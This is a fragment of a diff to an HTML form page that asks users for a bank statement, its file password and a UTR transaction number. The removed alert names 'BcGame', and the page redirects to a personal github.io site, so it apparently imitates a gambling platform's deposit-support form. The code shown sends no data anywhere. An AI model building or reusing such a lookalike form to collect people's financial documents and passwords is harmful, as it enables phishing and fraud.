-                                        <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
-                                    </svg>
-                                </div>
-                            </button>
+                    </button>
+                </div>
+                
+                <div class="file-upload-container">
+                    <div class="file-icon">
+                        <div class="icon size-5 fill-primary">
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M17.8029 4.84082L17.8037 7.51897C17.8037 10.4131 20.1216 12.7708 23.0197 12.8721L23.2142 12.8753L25.9194 12.8745V22.1993C25.9194 24.9381 23.6988 27.1587 20.9601 27.1587H11.0414C8.30266 27.1587 6.08203 24.9381 6.08203 22.1993V9.80017C6.08203 7.06065 8.30266 4.84082 11.0414 4.84082H17.8037H17.8029ZM21.4288 19.6854L10.8604 19.691C10.2921 19.7484 9.84817 20.2234 9.84817 20.8013C9.84817 21.4174 10.3527 21.9172 10.9752 21.9172L21.5435 21.9116C22.1118 21.8542 22.5558 21.3792 22.5558 20.8013C22.5558 20.1852 22.0513 19.6854 21.4288 19.6854ZM21.4288 14.3291L10.8604 14.3347C10.2921 14.3921 9.84817 14.8671 9.84817 15.445C9.84817 16.0611 10.3527 16.5609 10.9752 16.5609L21.5435 16.5553C22.1118 16.4979 22.5558 16.0229 22.5558 15.445C22.5558 14.8289 22.0513 14.3291 21.4288 14.3291ZM20.9593 4.84082C23.698 4.84082 25.9186 7.06145 25.9186 9.80017V10.6427L23.2134 10.6435L23.0404 10.6387C21.4335 10.5526 20.1463 9.2765 20.0618 7.68475L20.057 7.51897V4.84082H20.9585H20.9593Z"></path>
+                            </svg>
                         </div>
-                        
-                        <div>
-                            <div class="my-2">Please provide UTR number:<b class="text-brand ml-1">*</b></div>
-                            <div class="input">
-                                <input placeholder="" id="utr-input">
-                            </div>
+                    </div>
+                    <div class="file-info">
+                        <div class="text-primary">Bank statement or transaction record from the past 30 days
+                            <button class="button button-m text-brand p-0 size-auto underline" type="button">Example</button>
                         </div>
-                        
-                        <div>
-                            <div class="my-2 text-secondary">Password of Bank statement file:<span class="text-xs text-secondary ml-1">(Optional)</span></div>
-                            <div class="input">
-                                <input placeholder="" id="password-input">
-                            </div>
+                        <div class="file-name" id="statement-name"></div>
+                    </div>
+                    <input type="file" class="sr-only" id="statement-file" accept="application/pdf">
+                    <button class="button button-m ml-auto flex-none text-brand flex items-center relative cursor-pointer file-upload-btn" type="button" data-target="statement-file">
+                        Upload
+                        <div class="icon size-5 rotate-180 pointer-events-none">
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                            </svg>
                         </div>
-                        
-                        <div class="text-base text-secondary relative mt-5">
-                            <div>Message<span class="text-xs text-secondary ml-1">(Optional)</span></div>
-                            <div class="text-xs absolute bottom-2 right-2 text-second" id="message-counter">0/1000</div>
-                            <textarea class="mt-2 w-full rounded-xl border border-solid border-input p-2 text-base bg-layer3" maxlength="1000" placeholder="Your message..." id="message-input"></textarea>
-                        </div>
-                        
-                        <button disabled class="button button-brand button-m w-full mt-9 h-12" type="button" id="submit-btn">Submit</button>
+                    </button>
+                </div>
+                
+                <div>
+                    <div class="my-2">Please provide UTR number:<b class="text-brand ml-1">*</b></div>
+                    <div class="input">
+                        <input placeholder="" id="utr-input">
                     </div>
                 </div>
+                
+                <div>
+                    <div class="my-2 text-secondary">Password of Bank statement file:<span class="text-xs text-secondary ml-1">(Optional)</span></div>
+                    <div class="input">
+                        <input placeholder="" id="password-input">
+                    </div>
+                </div>
+                
+                <div class="text-base text-secondary relative mt-5">
+                    <div>Message<span class="text-xs text-secondary ml-1">(Optional)</span></div>
+                    <div class="text-xs absolute bottom-2 right-2 text-second" id="message-counter">0/1000</div>
+                    <textarea class="mt-2 w-full rounded-xl border border-solid border-input p-2 text-base bg-layer3" maxlength="1000" placeholder="Your message..." id="message-input"></textarea>
+                </div>
+                
+                <button disabled class="button button-brand button-m w-full mt-9 h-12" type="button" id="submit-btn">Submit</button>
             </div>
         </div>
     </div>
@@ -769,7 +753,7 @@
             // Submit button functionality
             submitBtn.addEventListener('click', function() {
                 if (!this.disabled) {
-                    alert('Conform Submit to BcGame');
+                    alert('Form submitted successfully!');
                     window.location.href = "https://drmachin3.github.io/mypersonal/";
                     // In a real application, you would submit the form data to a server here
                 }
@@ -810,5 +794,4 @@
         });
     </script>
 </body>
-
 </html>
